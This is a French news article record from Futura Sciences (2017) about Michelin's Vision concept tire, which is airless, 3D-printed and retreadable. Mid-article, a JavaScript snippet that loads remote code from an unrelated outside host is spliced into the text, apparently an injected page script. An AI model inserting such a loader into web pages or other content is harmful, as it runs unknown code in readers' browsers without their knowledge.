{"title": "Michelin Vision, un pneu imprime en 3D et << rechargeable >>", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-06-16", "content": "Le manufacturier francais Michelin a devoile un concept de pneumatique qui fait aussi office de roue. Imprime en 3D avec des materiaux biodegradables, sa bande de roulement pourrait etre rechapee ou modifiee selon les conditions de conduite. Ce qu'il faut retenir Vision est un concept de pneumatique Michelin base sur l'impression 3D et le recours a des materiaux biodegradables et recycles. Le profil du pneu peut etre adapte a volonte en fonction de l'utilisation et sa bande de roulement peut etre renouvelee en cas d'usure prononcee. Les vacances d'ete approchent a grands pas et pour beaucoup d'automobilistes, c'est le moment de preparer leur  voiture  a un periple plus ou moins long. L'etat des pneumatiques est l'un des points cles a controler et aussi l'un des postes de depense les plus consequents. Que diriez-vous d'un  pneu  sans  air , biodegradable et dont la bande de roulement imprimee en 3D serait renouvelable ou modifiable selon le type de route ou de condition  meteo  que vous devez affronter ? Tel est le concept sur lequel planche Michelin. Le manufacturier francais vient de devoiler ce projet lors du symposium  Movin'On , un evenement dedie a la  mobilite durable  qui se tient cette semaine a Montreal (Canada). Le pneumatique  Michelin Vision  repose sur quatre innovations qui sont censees coller a ce que sera la mobilite de demain. Pour commencer, ce  pneu  fait aussi office de roue grace a une structure alveolaire creee par  impression 3D  et dont l'agencement presente une  rigidite  graduelle a mesure que l'on s'approche du centre. Depourvu d'air, ce pneu ne peut donc ni crever ni exploser. La partie centrale du Vision, equivalente a la jante classique, sera fabriquee pour partie avec des materiaux  biodegradables  issus notamment de copeaux de  bois , de paille ou d'ecorces d'oranges ainsi que de materiaux recycles (cannettes de boisson, composants electroniques, poudres issues de vieux pneumatiques).  A terme, Michelin explique qu'il compte pouvoir produire du butadiene, qui entre dans la composition du  caoutchouc  synthetique, a partir de ces materiaux renouvelables afin de reduire le recours aux produits petroliers. Quant au caoutchouc naturel utilise pour la bande de roulement, il sera produit dans des fermes eco-responsables, precise le constructeur. Et ce n'est pas tout... Une vue detaillee de la structure alveolaire du pneumatique Vision de Michelin. La rigidite va en augmentant a mesure que l'on se rapproche du centre. (c) Michelin                               Un concept  << realiste >> , selon Michelin Grace a l' impression 3D , il sera possible de personnaliser le profil du  pneu  en fonction de l'utilisation ou de la saison. Par exemple, le client Michelin pourra opter pour une structure adaptee aux conditions d'hiver en montagne avant de partir faire du ski puis repasser sur une configuration plus propice a un long trajet sur autoroute, l'ete venu. Sur le meme principe, il sera possible de << recharger >> le pneu, ou plus precisement de le rechaper, lorsque ses  capteurs  integres signaleront un niveau d'usure avance.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Le concept Vision est une demonstration de notre expertise ainsi qu'une promesse d'avenir. Michelin decrit une utilisation d'une grande simplicite.  Via  une  application  sur son  smartphone , le conducteur est tenu informe de l'etat de ses pneus et peut programmer une intervention pour changer le profil ou rechaper la bande de roulement. Sur le papier, creer un  pneumatique  aussi respectueux de l'environnement et durable est tout a fait louable. Mais est-ce realiste ?  <<  Compte tenu de la facon dont nous l'avons developpe, le concept Vision est une demonstration de notre expertise ainsi qu'une promesse d'avenir , assure Mostapha El-Oulhani, chef du projet Vision.  Nous voulions que Vision soit realiste car le fait de concevoir des objets ou des services dont nous savons pertinemment qu'ils sont irrealistes ne sert aucun but.  >> Pour autant, Michelin ne s'avance pas sur une date d'introduction ne serait-ce que partielle des technologies decrites dans ce projet. Sept impressions 3D incroyables a decouvrir en video                       L'impression 3D est en train de revolutionner la facon dont nous concevons, developpons et construisons les choses. Le futur de l'industrie sera donc certainement imprime en 3D. Voici en video un apercu des plus folles impressions deja accomplies.                                       ", "theme": "tech"}